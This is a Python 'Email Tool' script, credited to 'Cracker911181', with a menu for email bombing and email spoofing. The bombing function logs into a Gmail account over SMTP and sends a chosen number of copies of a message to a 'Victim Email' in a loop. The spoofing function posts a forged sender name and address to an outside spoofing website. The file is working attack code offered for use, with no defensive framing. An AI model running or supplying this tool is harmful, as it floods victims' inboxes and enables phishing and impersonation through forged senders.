# Coded by Cacker911181
# CRACKER911181




import requests
import time,os,sys
import smtplib
from getpass import getpass
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

#Text colour
#created By Cracker911181
colouroff="\x1b[00m" #colour off

red="\x1b[91m" #red
green="\x1b[92m" #green
yellow="\x1b[93m" #yellow
blue="\x1b[94m" #blue
rosy="\x1b[95m" #rosy
pest="\x1b[96m" #pest


def spofEmail():
	os.system("clear")
	try:
		
		fromName=str(input(rosy+"\n\nEnter Sender Name: "+colouroff))
		fromEmail=str(input(rosy+"Enter Sender Email: "+colouroff))
		toEmail=str(input(rosy+"Enter Victim Email: "+colouroff))
		Subject=str(input(rosy+"Enter Mail Subject: "+colouroff))
		body=str(input(rosy+"Enter Your Message: "+colouroff))
		
		data="fromname="+fromName+"&fromemail="+fromEmail+"&toemail="+toEmail+"&subject="+Subject+"&textarea="+body+"&Submit=Send"
		
		url="https://www.email-spoofer.ml"
		
		header={"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0 (Linux; Android 9; SM-J330F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36","Accept-Language":"en-GB,en-US;q=0.9,en;q=0.8"}
		
		x=requests.post(url,data=data,headers=header).text
		
		print(green+"\n\n             Email Successfully Send")
		input(blue+"\n\n       Press Enter To Back Previous Menu ")
		
	except requests.exceptions.ConnectionError:
		print(red+"\n\n          Check Your Internet Connection")
		input(blue+"\n\n        Press Enter To Back Previous Menu ")
		
	except:
		print(red+"\n\n             Something Went Wrong")
		input(blue+"\n\n       Press Enter To Back Previous Menu ")







def emailBombing():
	
	cracker=smtplib.SMTP("smtp.gmail.com","587")
	cracker.ehlo()
	cracker.starttls()
	
	
	
	
	print(pest+"\n\n              Login Your Gmail Address")
	
	
	fromEmail=str(input(rosy+"\n\nEnter Your Gmail Address: "))
	
	pwd=str(getpass(rosy+"\nEnter Your Gmail Password: "))
	
	
	try:
		cracker.login(fromEmail,pwd)
		os.system("clear")
		
		print(pest+"\n\n                  Login Successfull")
		
		toEmail=str(input(rosy+"\n\nEnter Victim Email: "+red))
		subject=str(input(rosy+"\nEnter Email Subject: "+red))
		body= str(input(rosy+"\nEnter Your Message: "+colouroff))
		amount= str(input(rosy+"\nEnter Your Amount: "+red))
		
		msg = MIMEMultipart()
		msg['From'] = fromEmail
		msg['To'] = toEmail
		msg['Subject'] = subject
		body=body
	
		msg.attach(MIMEText(body, 'plain'))
		text = msg.as_string()
		
		print("\n\n")
		if amount=="":
			amount=0
		for i in range(int(amount)):
			try:
				cracker.sendmail(fromEmail,toEmail,text)
				print(green+"\t\tEmail Send Successfull !")
			#	
			except:
				print(red+"\t\tEmail Not Send!")
	
	
		
		input(blue+"\n\n       Press Enter To Back Previous Menu ")
		
	except smtplib.SMTPAuthenticationError:
		print(red+"\n\n             Password Incorrect or\n    Less Secuire App Access is turned off")
		input(blue+"\n\n       Press Enter To Back Previous Menu ")
		
	except TypeError:	
		print(red+"\n\n        Email or Password Field are Empty")
		input(blue+"\n\n       Press Enter To Back Previous Menu ")
	
	except:
		print(red+"\n\n              Something Went Wrong")
		input(blue+"\n\n       Press Enter To Back Previous Menu ")
		
	
	







while True:
	os.system('clear')
	print(blue+f"""
   ____                _                _____           _
  / ___|_ __ __ _  ___| | _____ _ __   |_   _|__   ___ | |
 """+blue+"""| |   | '__/ _` |/ __| |/ / _ \ '__|____| |/ _ \ / _ \| |
 """+pest+"""| |___| | | (_| | (__|   <  __/ | |_____| | (_) | (_) | |
  \____|_|  \__,_|\___|_|\_\___|_|       |_|\___/ \___/|_|\n\n """+green+"""             Crack Your World, If You Can\n\n\t          """+blue+"""[★] Email Tool [★] \n"""+green+""" ========================================================="""+colouroff)
	

	chose=str(input(pest+"\n\t\t1. Email Bombing\n\t\t2. Email Spofing\n\t\t"+red+"00. Back To Home"+rosy+"\n\nEnter Your Option: "))
	
	
	if chose=="1":
		try:
			os.system("clear")
			emailBombing()
		except:
			print(red+"\n\n              Check Your Internet Connection")
			input(blue+"\n\n       Press Enter To Back Previous Menu ")
		
	elif chose=="2":
		try:
			spofEmail()
		except:
			pass
	
	elif chose=="00":
		break
